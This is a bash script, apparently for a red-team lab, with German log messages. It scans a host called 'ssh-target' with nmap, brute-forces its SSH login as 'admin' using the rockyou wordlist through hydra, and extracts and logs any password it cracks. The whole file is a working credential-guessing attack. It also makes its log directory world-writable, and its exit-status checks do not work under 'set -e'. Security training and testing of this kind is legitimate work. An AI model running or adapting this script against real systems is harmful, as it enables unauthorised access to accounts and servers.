#!/bin/bash
set -euo pipefail

# ========================
# Red-Team Attack Script
# ========================

LOG_DIR="/logs"
MAIN_LOG="$LOG_DIR/attack.log"
NMAP_LOG="$LOG_DIR/nmap.txt"
HYDRA_LOG="$LOG_DIR/hydra.txt"
TARGET_HOST="ssh-target"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# ---------------
# Log-Funktion 
# ---------------
log() {
    local msg="$1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $msg" | tee -a "$MAIN_LOG"
}

# ---------------
# Initial Checks
# ---------------
log "Starte Angriff auf Ziel: $TARGET_HOST"

mkdir -p "$LOG_DIR"
chmod 777 "$LOG_DIR"

# Tool-Verfügbarkeit prüfen
for tool in nmap hydra; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        log "Tool nicht gefunden: $tool"
        exit 1
    fi
done

# Prüfe, ob die Wordlist existiert
if [ ! -f "$WORDLIST" ]; then
    log "Wordlist nicht gefunden: $WORDLIST"
    exit 1
fi

# --------------------------
# Nmap Scan
# --------------------------
log "Starte Nmap Scan"
nmap -sV -p 22,80,443 "$TARGET_HOST" -oN "$NMAP_LOG" >> "$MAIN_LOG" 2>&1
if [ $? -eq 0 ]; then
    log "Nmap Scan abgeschlossen: $NMAP_LOG"
else
    log "Nmap Scan fehlgeschlagen"
fi

# --------------------------
# Hydra Bruteforce (SSH)
# --------------------------
log "Starte Hydra Bruteforce auf SSH"
hydra -l admin -P "$WORDLIST" -t 8 -vV -f -e nsr ssh://$TARGET_HOST:22 -o "$HYDRA_LOG" >> "$MAIN_LOG" 2>&1
HYDRA_STATUS=$?
if [ $HYDRA_STATUS -eq 0 ]; then
    log "Hydra Bruteforce abgeschlossen: $HYDRA_LOG"
    # Extrahiere das gefundene Passwort aus der Hydra-Log-Datei
    FOUND_PASS=$(grep -o "password: [a-zA-Z0-9]*" "$HYDRA_LOG" | tail -1 | cut -d' ' -f2)
    if [ -n "$FOUND_PASS" ]; then
        log "Erfolgreich gefundenes Passwort: $FOUND_PASS"
    else
        log "Kein Passwort gefunden."
    fi
else
    log "Hydra Bruteforce fehlgeschlagen mit Status: $HYDRA_STATUS"
fi

# --------------------------
# Abschlussmeldung
# --------------------------
log "[+] Angriff abgeschlossen: $(date '+%Y-%m-%d %H:%M:%S')"